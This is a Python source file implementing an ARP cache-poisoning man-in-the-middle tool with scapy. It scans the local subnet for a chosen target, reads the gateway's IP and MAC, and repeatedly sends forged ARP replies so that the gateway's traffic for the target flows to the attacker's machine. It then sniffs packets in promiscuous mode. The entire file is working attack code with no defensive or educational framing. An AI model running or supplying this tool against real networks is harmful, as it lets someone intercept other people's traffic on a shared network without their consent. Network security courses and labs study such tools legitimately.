from scapy.layers.l2 import ARP, arping
from scapy.layers.inet import IP, Ether, TCP
from scapy.sendrecv import sendp, sr1
from scapy.all import sniff, get_if_addr, conf
import threading
import keyboard
import time
from getmac import get_mac_address as gma
import subprocess
import re

# Constants
DEFAULT_GATEWAY_IP = "10.0.0.138"
DEFAULT_GATEWAY_MAC = "ff:ff:ff:ff:ff:ff"
INTERFACE = conf.iface


def check_target():
    # Getting the target IP from the user
    target_ip = input("Enter Target:")

    # Getting the localhost IP from the NIC
    localhost_ip = get_if_addr(INTERFACE)

    # Defining the subnet according to the localhost's IP address
    subnet = ".".join(localhost_ip.split('.')[0:3]) + ".0/24"

    # Using the arping function to ARP check all the hosts in the LAN to find the target
    arp_answers, _ = arping(subnet, verbose=0)

    # For each online host, we check if it matches our target's IP address
    for query_answer in arp_answers:
        packet = query_answer.answer
        found_host_ip = packet["ARP"].psrc
        if found_host_ip == target_ip:
            print(f"target {target_ip} is up")
            return target_ip

    # If the target wasn't found, we return None
    print("target is probably down")
    return None


def arp_poison(target_ip="0.0.0.0", gateway_ip="0.0.0.0",
               gateway_mac="ff:ff:ff:ff:ff:ff", operation_duartion=5):
    # Setting the start time of the operation
    start_time = time.perf_counter()

    while True:
        # With each loop iteration, We check the current global time
        current_time = time.perf_counter()

        # If the elapsed time has passed the wanted operation duration time of the user, the thread stops
        elapsed_time = current_time - start_time
        if elapsed_time >= operation_duartion:
            break

        # We form an ARP type 2 (reply) telling the gateway router our MAC address is the target's MAC address
        localhost_MAC = gma()
        p = Ether(dst=gateway_mac) / ARP(hwlen=6, plen=4, op=2, psrc=target_ip, hwsrc=localhost_MAC, hwdst=gateway_mac,
                                         pdst=gateway_ip)
        # Sending the packet
        sendp(p, verbose=0, iface=INTERFACE)

        # Waiting 1 second between packets sending
        time.sleep(1)

        # If the user wants to break the operation, he can press q
        if keyboard.is_pressed("q"):
            exit()


def sniff_data(operation_duration=5, target_ip=''):
    while True:

        # Setting the localhosts NIC to sniff packets that are not destined to localhost
        conf.promisc = True

        # Start Sniffing for the operation duration the user wanted
        capture = sniff(timeout=operation_duration)

        # Printing Packets Sniffed and stopping the thread
        print(capture.summary())

        # If the user wants to break the operation, he can press q
        if keyboard.is_pressed("q"):
            exit()
        break


def get_defaultgateway_details():
    gateway_ip = None
    # Getting the default gateway IP from the system's networking settings using regex matching
    try:
        ipconfig_output = subprocess.check_output("ipconfig", shell=True).decode()
        gateway_ip_pattern = re.compile(
            r"(Default Gateway|Gateway)\s*(?:\:|.)\s*((?:\d{1,3}\.){3}\d{1,3}|(?:[a-fA-F0-9]{1,4}:){7}[a-fA-F0-9]{1,4})",
            re.MULTILINE)
        matches = gateway_ip_pattern.findall(ipconfig_output)
        for match in matches:
            if '.' in match[1]:
                gateway_ip = match[1]
    except Exception as e:
        raise Exception(f"Error obtaining default gateway IP: {e}")

    # Returning the found details
    return [gateway_ip, gma(ip=gateway_ip)]


def main():
    # Input of time duration the user wants
    operation_duration = int(input("Enter operation duration time in seconds: "))

    # Getting the target IP from the user and checks it is online
    target_ip = check_target()

    # Getting the default gateway router's IP and MAC addresses
    default_gateway_details = get_defaultgateway_details()

    # If the target is up (target_ip is not None) - we proceed
    if target_ip:
        threads = []

        # Defining the ARP poison thread, passing the relevant details, and starting it
        poison_thread = threading.Thread(target=arp_poison,
                                         args=(target_ip, default_gateway_details[0], default_gateway_details[1],
                                               operation_duration))
        threads.append(poison_thread)
        poison_thread.start()

        print("Started ARP Poisoning")

        # Defining the Packet Sniffing thread and starting it
        sniff_thread = threading.Thread(target=sniff_data, args=([operation_duration,target_ip]))
        threads.append(sniff_thread)
        sniff_thread.start()
        print("Started Packet Sniffing")

        for thread in threads:
            thread.join()


if __name__ == "__main__":
    main()
